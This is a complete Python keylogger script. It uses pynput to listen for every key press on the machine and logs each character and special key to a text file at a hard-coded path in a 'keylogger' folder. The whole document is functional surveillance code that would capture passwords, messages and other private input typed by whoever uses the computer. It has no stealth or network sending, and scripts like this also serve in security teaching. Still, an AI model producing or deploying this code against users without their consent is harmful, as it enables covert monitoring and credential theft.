from pynput import keyboard
import logging
import os

# Define the full path for the log file
log_file_path = r"C:\Users\aliab\OneDrive\Desktop\keylogger\key_log.txt"  # Change this to your desired path

# Ensure the directory exists
os.makedirs(os.path.dirname(log_file_path), exist_ok=True)

# Set up logging configuration
logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(message)s')

def on_press(key):
    try:
        # Log the key as a character
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        # Log special keys with a custom message
        logging.info(f'Special key {key} pressed')

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
